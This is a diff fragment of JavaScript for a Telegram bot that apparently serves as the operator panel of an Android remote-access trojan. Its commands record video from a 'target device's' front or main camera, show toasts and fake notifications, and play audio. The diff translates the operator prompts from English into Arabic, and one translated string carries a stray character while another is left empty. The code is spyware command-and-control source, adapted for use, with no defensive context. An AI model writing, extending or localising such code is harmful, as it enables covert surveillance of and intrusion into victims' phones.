     if (commend == 'rec_camera_selfie') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
+            '°• أدخل المدة التي ترغب في تسجيل الفيديو بها باستخدام الكاميرا الأمامية.\n\n' +
+            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثواني',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -849,8 +849,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'rec_camera_main') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
+            '°• أدخل المدة التي ترغب في تسجيل الفيديو بها باستخدام الكاميرا الرئيسية\n\n' +
+            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثوانيꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -858,8 +858,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'toast') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
-            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
+            '°• أدخل الرسالة التي ترغب في ظهورها على الجهاز المستهدف\n\n' +
+            '• ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -867,8 +867,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'show_notification') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
-            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
+            '°•أدخل الرسالة التي ترغب في ظهورها كإشعار\n\n' +
+            '• ستظهر رسالتك في شريط الحالة للجهاز المستهدف مثل إشعار عادي',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -876,8 +876,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'play_audio') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
+            '°• أدخل رابط الصوت الذي ترغب في تشغيله\n\n' +
+            '• يرجى ملاحظة أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
